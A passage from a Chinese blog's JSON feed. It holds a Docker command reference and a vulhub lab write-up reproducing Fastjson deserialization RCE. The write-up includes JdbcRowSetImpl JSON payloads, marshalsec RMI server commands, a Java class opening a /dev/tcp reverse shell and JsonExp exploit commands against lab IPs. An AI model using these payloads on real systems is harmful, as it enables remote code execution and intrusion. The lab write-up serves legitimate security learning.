            "content_html": "<h1 id=\"Docker使用基础详解\"><a href=\"#Docker使用基础详解\" class=\"headerlink\" title=\"Docker使用基础详解\"></a>Docker使用基础详解</h1><h2 id=\"一、什么是docker\"><a href=\"#一、什么是docker\" class=\"headerlink\" title=\"一、什么是docker\"></a>一、什么是docker</h2><p>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从 Apache2.0 协议开源。</p>\n<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>\n<p>容器是完全使用沙箱机制，相互之间不会有任何接口，更重要的是容器性能开销极低。</p>\n<ul>\n<li>容器和镜像</li>\n</ul>\n<p>通过镜像启动一个容器，一个镜像是一个可执行的包，其中包括运行应用程序所需要的所有内容包含代码，运行时间，库、环境变量、和配置文件。容器是镜像的运行实例，当被运行时有镜像状态和用户进程，可以使用docker ps 查看。</p>\n<ul>\n<li>容器和虚拟机</li>\n</ul>\n<p>容器时在linux上本机运行，并与其他容器共享主机的内核，它运行的一个独立的进程，不占用其他任何可执行文件的内存，非常轻量。</p>\n<p>虚拟机运行的是一个完成的操作系统，通过虚拟机管理程序对主机资源进行虚拟访问，相比之下需要的资源更多。</p>\n<h2 id=\"二、docker和docker-compose\"><a href=\"#二、docker和docker-compose\" class=\"headerlink\" title=\"二、docker和docker-compose\"></a>二、docker和docker-compose</h2><p><a href=\"https://blog.csdn.net/Prince_WCS/article/details/135180728\">原文链接 ψ(｀∇´)ψ 强烈推荐看完</a></p>\n<p>Docker 是一种可以让您把 WordPress 应用和它需要的环境（比如 PHP、MySQL 等）打包成一个个小盒子的技术，这个小盒子就叫做容器。</p>\n<p>Docker Compose 是一种可以让您用一个文件来管理多个容器的工具，是 Docker 的一个子项目，可以帮助用户定义和运行多容器 Docker 应用程序，使用 Docker Compose 可以更轻松地管理多个容器的应用程序。</p>\n<p>比如，您的 WordPress 应用可能需要一个 web 容器和一个 db 容器，分别运行 WordPress 程序和 MySQL 数据库。如果您只用 Docker，您可能需要分别创建和启动这两个容器，然后还要设置它们之间的连接。如果您用 Docker Compose，您只需要在一个文件里写下这两个容器的配置，然后用一个命令就可以一起创建和启动它们，而且它们之间的连接也会自动设置好。这样，您就可以更轻松地管理和运行您的 WordPress 应用。</p>\n<h2 id=\"三、常用命令\"><a href=\"#三、常用命令\" class=\"headerlink\" title=\"三、常用命令\"></a>三、常用命令</h2><h3 id=\"docker常用命令\"><a href=\"#docker常用命令\" class=\"headerlink\" title=\"docker常用命令\"></a>docker常用命令</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">**************************************docker命令******************************************</span><br><span class=\"line\"># 启动docker</span><br><span class=\"line\">systemctl start docker</span><br><span class=\"line\"> </span><br><span class=\"line\"># 关闭docker</span><br><span class=\"line\">systemctl stop docker</span><br><span class=\"line\"> </span><br><span class=\"line\"># 重启docker</span><br><span class=\"line\">systemctl restart docker</span><br><span class=\"line\"> </span><br><span class=\"line\"># docker设置随服务启动而自启动</span><br><span class=\"line\">systemctl enable docker</span><br><span class=\"line\"></span><br><span class=\"line\">************************************docker镜像命令*****************************************</span><br><span class=\"line\"># 拉取镜像</span><br><span class=\"line\"># 不加tag(版本号) 即拉取docker仓库中 该镜像的最新版本latest 加:tag 则是拉取指定版本</span><br><span class=\"line\"># https://hub.docker.com/search?type=image （去官网镜像搜索）</span><br><span class=\"line\">docker pull 镜像名 </span><br><span class=\"line\">docker pull 镜像名:tag</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看镜像列表</span><br><span class=\"line\">docker images</span><br><span class=\"line\"></span><br><span class=\"line\"># 搜索镜像</span><br><span class=\"line\">docker search 镜像名</span><br><span class=\"line\">docker search --filter=STARS=9000 mysql 搜索 STARS &gt;9000的 mysql 镜像</span><br><span class=\"line\"></span><br><span class=\"line\"># 删除镜像</span><br><span class=\"line\"># 删除一个</span><br><span class=\"line\">docker rmi -f 镜像名/镜像ID</span><br><span class=\"line\"># 删除多个 其镜像ID或镜像用用空格隔开即可 </span><br><span class=\"line\">docker rmi -f 镜像名/镜像ID 镜像名/镜像ID 镜像名/镜像ID</span><br><span class=\"line\"> </span><br><span class=\"line\"># 删除全部镜像  -a 意思为显示全部, -q 意思为只显示ID</span><br><span class=\"line\">docker rmi -f $(docker images -aq)</span><br><span class=\"line\"></span><br><span class=\"line\">************************************docker容器命令*****************************************</span><br><span class=\"line\"># 查看所有容器列表（包含 正在运行 和 已停止的）</span><br><span class=\"line\">docker ps -a</span><br><span class=\"line\"></span><br><span class=\"line\"># 启动容器</span><br><span class=\"line\">docker start 容器ID/容器名</span><br><span class=\"line\"> </span><br><span class=\"line\"># 停止容器</span><br><span class=\"line\">docker stop 容器ID/容器名</span><br><span class=\"line\"> </span><br><span class=\"line\"># 重启容器</span><br><span class=\"line\">docker restart 容器ID/容器名</span><br><span class=\"line\"></span><br><span class=\"line\"># kill 容器</span><br><span class=\"line\">docker kill 容器ID/容器名</span><br><span class=\"line\"> </span><br><span class=\"line\"># 容器文件拷贝 （无论容器是否开启 都可以进行拷贝）</span><br><span class=\"line\"># docker cp 容器ID/名称:文件路径  要拷贝到外部的路径 | 要拷贝到外部的路径  容器ID/名称:文件路径</span><br><span class=\"line\"># 示例：docker cp nginx:/etc/nginx/conf.d /data/applications/nginx/conf/conf.d</span><br><span class=\"line\"># 从容器内 拷出</span><br><span class=\"line\">docker cp 容器ID/名称: 容器内路径  容器外路径</span><br><span class=\"line\"># 从外部 拷贝文件到容器内</span><br><span class=\"line\">docker  cp 容器外路径 容器ID/名称: 容器内路径</span><br><span class=\"line\"> </span><br><span class=\"line\"># 查看容器日志</span><br><span class=\"line\">docker logs -f --tail=要查看末尾多少行，默认all 容器ID</span><br><span class=\"line\"> </span><br><span class=\"line\"># 更换容器名</span><br><span class=\"line\">docker rename 容器ID/容器名 新容器名</span><br><span class=\"line\"></span><br><span class=\"line\"># 停止运行的容器 </span><br><span class=\"line\">docker stop 容器名/容器ID</span><br><span class=\"line\"> </span><br><span class=\"line\"># 删除一个容器</span><br><span class=\"line\">docker rm -f 容器名/容器ID</span><br><span class=\"line\"> </span><br><span class=\"line\"># 删除多个容器 空格隔开要删除的容器名或容器ID</span><br><span class=\"line\">docker rm -f 容器名/容器ID 容器名/容器ID 容器名/容器ID</span><br><span class=\"line\"> </span><br><span class=\"line\"># 删除全部容器</span><br><span class=\"line\">docker rm -f $(docker ps -aq)</span><br><span class=\"line\"></span><br><span class=\"line\"># 进入容器</span><br><span class=\"line\">docker exec -it 容器名/容器ID /bin/bash</span><br><span class=\"line\"></span><br><span class=\"line\"># 直接退出 （如果没有添加-d 参数(持久化运行容器) 该容器会被关闭 ） </span><br><span class=\"line\">exit</span><br><span class=\"line\"> </span><br><span class=\"line\"># 优雅退出 （无论是否添加-d 参数 容器都不会被关闭）</span><br><span class=\"line\">Ctrl + p + q </span><br><span class=\"line\"></span><br><span class=\"line\"># 查看 Docker 容器、镜像、卷等资源的占用情况</span><br><span class=\"line\">docker system df</span><br><span class=\"line\"></span><br><span class=\"line\"># 清理所有废弃镜像与Build Cache \t\t#谨慎使用</span><br><span class=\"line\">docker system prune -a</span><br><span class=\"line\">#清理整个 Docker 系统中的未在使用资源，包括未使用的镜像、容器、网络和数据卷等。</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"docker-compose常用命令\"><a href=\"#docker-compose常用命令\" class=\"headerlink\" title=\"docker-compose常用命令\"></a>docker-compose常用命令</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查看帮助</span><br><span class=\"line\">docker-compose -h                           </span><br><span class=\"line\"></span><br><span class=\"line\"># 启动所有docker-compose服务</span><br><span class=\"line\">docker-compose up   </span><br><span class=\"line\"></span><br><span class=\"line\"># 启动所有docker-compose服务并后台运行</span><br><span class=\"line\">docker-compose up -d          </span><br><span class=\"line\"></span><br><span class=\"line\">#强制终止正在运行的服务容器</span><br><span class=\"line\">docker-compose kill</span><br><span class=\"line\"></span><br><span class=\"line\"># 停止并删除容器、网络、卷、镜像</span><br><span class=\"line\">docker-compose down</span><br><span class=\"line\"></span><br><span class=\"line\"># 进入容器实例内部yml文件中写的服务id /bin/bash</span><br><span class=\"line\">docker-compose exec  yml里面的服务id         </span><br><span class=\"line\"></span><br><span class=\"line\"># 展示当前docker-compose编排过的运行的所有容器</span><br><span class=\"line\">docker-compose ps</span><br><span class=\"line\"></span><br><span class=\"line\"># 展示当前docker-compose编排过的容器进程</span><br><span class=\"line\">docker-compose top                     </span><br><span class=\"line\"></span><br><span class=\"line\"># 查看容器输出日志</span><br><span class=\"line\">docker-compose logs  yml里面的服务id     </span><br><span class=\"line\"></span><br><span class=\"line\"># 检查配置</span><br><span class=\"line\">docker-compose config</span><br><span class=\"line\"></span><br><span class=\"line\"># 检查配置，有问题才有输出</span><br><span class=\"line\">docker-compose config -q  </span><br><span class=\"line\"></span><br><span class=\"line\"># 启动服务</span><br><span class=\"line\">docker-compose start</span><br><span class=\"line\"></span><br><span class=\"line\"># 停止服务</span><br><span class=\"line\">docker-compose stop      </span><br><span class=\"line\"></span><br><span class=\"line\"># 重启服务</span><br><span class=\"line\">docker-compose restart   </span><br></pre></td></tr></table></figure>\n\n\n\n<p>参考文章：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/89587030\">https://zhuanlan.zhihu.com/p/89587030</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/187505981\">https://zhuanlan.zhihu.com/p/187505981</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/620097083\">https://zhuanlan.zhihu.com/p/620097083</a></p>\n<p><a href=\"https://blog.csdn.net/Prince_WCS/article/details/135180728\">https://blog.csdn.net/Prince_WCS/article/details/135180728</a></p>\n<p><a href=\"https://blog.csdn.net/Pan_peter/article/details/128860771\">https://blog.csdn.net/Pan_peter/article/details/128860771</a></p>\n<p><a href=\"https://blog.csdn.net/qq_38924779/article/details/135035765\">https://blog.csdn.net/qq_38924779/article/details/135035765</a></p>\n<p><a href=\"https://www.freecodecamp.org/chinese/news/how-to-remove-all-docker-images-a-docker-cleanup-guide/\">https://www.freecodecamp.org/chinese/news/how-to-remove-all-docker-images-a-docker-cleanup-guide/</a></p>\n",
            "tags": [
                "转载",
                "基础"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Fastjson漏洞复现",
            "date_published": "2024-04-25T11:30:55.983Z",
            "content_html": "<h1 id=\"【vulhub】Fastjson漏洞复现\"><a href=\"#【vulhub】Fastjson漏洞复现\" class=\"headerlink\" title=\"【vulhub】Fastjson漏洞复现\"></a>【vulhub】Fastjson漏洞复现</h1><h1 id=\"1-2-24-rce\"><a href=\"#1-2-24-rce\" class=\"headerlink\" title=\"1.2.24-rce\"></a>1.2.24-rce</h1><h2 id=\"漏洞原理：\"><a href=\"#漏洞原理：\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>\n<p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p>\n<p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！</p>\n<p>因为目标环境是Java 8u102，没com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p>\n<p>影响范围：fastjson&lt;&#x3D;1.2.24</p>\n<h2 id=\"漏洞复现：\"><a href=\"#漏洞复现：\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>实验前提：python3版本，java1.8版本</p>\n<p>java环境配置可参考文章：<a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p>漏洞验证，利用dnslog等平台进行验证，BP抓包，修改为POST方法，修改Content-Type，放入payload，然后发送数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 74</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dgs0uq.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425203104478.png\" alt=\"image-20240425203104478\"></p>\n<p>漏洞利用，首先编译payload，利用<code>javac TouchFile.java</code>命令，编译TouchFile.java文件，生成TouchFile.class文件，实际情况中需要将编译好的payload放在公网服务器上的，这里只是进行本地的验证尝试，理解即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javac TouchFile.java</span><br><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\"> </span><br><span class=\"line\">public class TouchFile &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/successFrank&quot;&#125;;</span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            // do nothing</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>这里就将kali作为放置payload的服务器，进入放置payload的目录，进行如下命令，启动服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server 5555</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174031274.png\" alt=\"image-20240425174031274\"></p>\n<p>接下来使用marshalsec项目，启动RMI服务，监听9999端口，并制定加载远程类TouchFile.class</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/mbechler/marshalsec\">marshalsec项目下载地址</a></p>\n<p>项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174713907.png\" alt=\"image-20240425174713907\"></p>\n<p>然后访问靶机，BP抓包，进行修改，将GET方法改为POST方法发送，修改Content-Type，加入payload，发送，观察响应报文发现已经成功创建。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 168</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/TouchFile&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-25%20174829.png\" alt=\"屏幕截图 2024-04-25 174829\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425175440976.png\" alt=\"image-20240425175440976\"></p>\n<p>也可以直接进入docker容器中进行查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker exex –it 你的CONTAINER_ID bash</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>上面的过程理解之后</strong>，然后开始尝试getshell，还是先编译payload，注意修改里面的ip和端口，还有一点需要注意，该Java文件的文件名需要和其内容中的public后的公共类相同，具体参考java的命名规范，否则是会出现编译错误的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javac GetShell.java</span><br><span class=\"line\">import java.lang.Runtime;</span><br><span class=\"line\">import java.lang.Process;</span><br><span class=\"line\"> </span><br><span class=\"line\">public class GetShell &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.100.131/7777 0&gt;&amp;1&quot;&#125;;</span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            // do nothing</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>nc开启监听，等待shell反弹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 7777</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182200299.png\" alt=\"image-20240425182200299\"></p>\n<p>python开启http服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -m http.server 5555</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182338663.png\" alt=\"image-20240425182338663\"></p>\n<p>开启RMI服务，并监听9999端口，注意修改对应内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#GetShell&quot; 9999 </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182500809.png\" alt=\"image-20240425182500809\"></p>\n<p>BP抓包，改为POST请求方法，修改Content-Type，加入payload(注意修改内容)并发送</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 173</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/GetShell&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>然后就发现已经成功进行getshell操作了</p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183720913.png\" alt=\"image-20240425183720913\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183748769.png\" alt=\"image-20240425183748769\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183934178.png\" alt=\"image-20240425183934178\"></p>\n<p><strong>或利用工具进行漏洞验证</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JsonExp -u http://192.168.100.134:8090/ -l tvcy5n.dnslog.cn</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195446761.png\" alt=\"image-20240425195446761\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/TouchFile</span><br><span class=\"line\">JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/GetShell</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195613834.png\" alt=\"image-20240425195613834\"></p>\n<h1 id=\"1-2-47-rce\"><a href=\"#1-2-47-rce\" class=\"headerlink\" title=\"1.2.47-rce\"></a>1.2.47-rce</h1><h2 id=\"漏洞原理：-1\"><a href=\"#漏洞原理：-1\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>\n<h2 id=\"漏洞复现：-1\"><a href=\"#漏洞复现：-1\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>基本流程手法和上面一个漏洞基本相同，只是最后的BP发送的payload稍稍有点区别</p>\n<p>和上一个一样，先开启各项服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 